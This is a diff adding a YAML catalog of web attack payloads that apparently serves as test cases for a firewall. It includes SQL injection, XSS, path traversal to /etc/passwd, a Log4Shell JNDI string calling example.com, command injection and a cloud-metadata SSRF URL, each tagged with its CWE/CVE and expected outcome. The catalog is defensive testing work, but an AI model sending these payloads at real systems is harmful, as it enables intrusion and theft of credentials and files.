@@ -1,0 +1,86 @@
+# Attack vectors as data rather than as Python.
+#
+# The catalog is now reviewable by someone who does not read Python, diffable
+# when it changes, and extensible without touching code. Every entry cites a
+# reference so "why is this here" has an answer.
+
+- id: sqli-union-select
+  category: sqli
+  location: query
+  payload: "1' UNION SELECT NULL,NULL,NULL--"
+  reference: CWE-89
+  expect: blocked
+
+- id: sqli-boolean-tautology
+  category: sqli
+  location: query
+  payload: "1' OR '1'='1"
+  reference: CWE-89
+  expect: blocked
+
+- id: sqli-time-based
+  category: sqli
+  location: query
+  payload: "1'; WAITFOR DELAY '0:0:5'--"
+  reference: CWE-89
+  expect: blocked
+
+- id: xss-script-tag
+  category: xss
+  location: query
+  payload: "<script>alert(1)</script>"
+  reference: CWE-79
+  expect: blocked
+
+- id: xss-img-onerror
+  category: xss
+  location: query
+  payload: "<img src=x onerror=alert(1)>"
+  reference: CWE-79
+  expect: blocked
+
+- id: xss-svg-onload
+  category: xss
+  location: query
+  payload: "<svg/onload=alert(1)>"
+  reference: CWE-79
+  expect: blocked
+
+- id: traversal-etc-passwd
+  category: traversal
+  location: uri
+  payload: "../../../../etc/passwd"
+  reference: CWE-22
+  expect: blocked
+
+- id: traversal-encoded
+  category: traversal
+  location: uri
+  payload: "..%2f..%2f..%2fetc%2fpasswd"
+  reference: CWE-22
+  expect: blocked
+
+- id: log4shell-jndi
+  category: injection
+  location: header
+  header: X-Api-Version
+  payload: "${jndi:ldap://example.com/a}"
+  reference: CVE-2021-44228
+  expect: blocked
+
+- id: cmdi-semicolon
+  category: cmdi
+  location: query
+  payload: "; cat /etc/passwd"
+  reference: CWE-78
+  # Command injection is an application concern. The Common Rule Set catches
+  # some shapes, but this is expected to PASS the WAF -- and saying so is more
+  # honest than quietly dropping the case.
+  expect: allowed
+
+- id: ssrf-metadata
+  category: ssrf
+  location: query
+  payload: "http://169.254.169.254/latest/meta-data/"
+  reference: CWE-918
+  expect: blocked
